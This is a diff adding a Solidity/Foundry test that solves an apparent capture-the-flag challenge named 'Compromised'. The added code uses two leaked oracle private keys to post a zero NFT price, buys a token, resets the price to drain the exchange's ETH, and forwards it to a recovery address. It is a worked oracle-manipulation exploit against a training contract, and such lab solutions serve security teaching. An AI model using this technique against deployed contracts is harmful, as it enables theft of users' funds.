@@ -75,7 +75,34 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // The price oracle private key is exposed in the public environment.
+        // so that attacker can manipulate the price by `oracle.postPrice()`.
+        address priceSource1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address priceSource2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        vm.prank(priceSource1);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(priceSource2);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank(priceSource1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.prank(priceSource2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        (bool success,) = address(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        if(!success){
+            revert();
+        }
+        vm.stopPrank();
     }
 
     /**
